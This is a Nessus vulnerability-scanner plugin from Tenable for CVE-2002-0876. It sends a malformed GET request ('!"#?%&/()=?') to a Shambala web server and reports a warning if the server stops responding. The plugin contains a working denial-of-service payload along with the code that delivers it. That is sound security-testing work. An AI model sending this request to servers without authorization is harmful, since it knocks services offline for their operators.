#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CVE
#
# Status: untested

include("compat.inc");

if(description)
{
 script_id(10967);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2002-0876");
 script_bugtraq_id(4897);
 script_osvdb_id(8443);

 script_name(english:"Shambala Web Server Malformed HTTP GET Request DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
'It was possible to kill the web server by sending this request :
GET !"#?%&/()=?
Shambala is known to be vulnerable to this attack.' );
 script_set_attribute(attribute:"solution", value:
"Install a safer server or upgrade it." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/06/01");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/05/31");
 script_cvs_date("$Date: 2011/03/14 21:48:12 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english: "Kills a Shambala web server");
 script_category(ACT_DENIAL); 
 script_copyright(english:"This script is Copyright (C) 2002-2011 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_require_ports("Services/www", 80);
 script_dependencies("http_version.nasl", "no404.nasl");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2)
  exit(0, "this script only runs in 'Paranoid' mode");	# DoS may trigger FP

req = '!"#?%&/()=?';

port = get_http_port(default:80);

if(http_is_dead(port:port)) exit(0, "The web server on port "+port+" is dead");

w = http_send_recv3(method:"GET", item:req, port:port);

if (http_is_dead(port:port, retry: 3))
  security_warning(port);

